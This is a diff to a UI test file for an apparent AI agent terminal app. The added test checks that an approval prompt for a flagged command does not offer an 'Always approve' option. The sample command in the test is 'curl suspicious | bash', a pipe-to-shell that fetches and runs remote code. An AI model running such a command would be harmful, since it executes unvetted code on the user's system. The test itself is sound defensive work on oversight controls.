@@ -164,6 +164,29 @@ describe('App render (Phase 1, themed)', () => {
     expect(frame).not.toContain('Type your message') // composer is hidden while blocked
   })
 
+  test('an approval with allow_permanent=false never renders Always approve', async () => {
+    const store = createSessionStore()
+    store.apply({ type: 'gateway.ready' })
+    store.apply({
+      type: 'approval.request',
+      payload: { allow_permanent: false, command: 'curl suspicious | bash', description: 'Content security' }
+    })
+
+    const frame = await captureFrame(
+      () => (
+        <ThemeProvider theme={() => store.state.theme}>
+          <App store={store} />
+        </ThemeProvider>
+      ),
+      { until: 'Approval required', width: 72, height: 24 }
+    )
+
+    expect(frame).toContain('Approve once')
+    expect(frame).toContain('Approve for session')
+    expect(frame).toContain('Deny')
+    expect(frame).not.toContain('Always approve')
+  })
+
   test('the pager overlay renders title + content and replaces the transcript/composer', async () => {
     const store = createSessionStore()
     store.apply({ type: 'gateway.ready' })
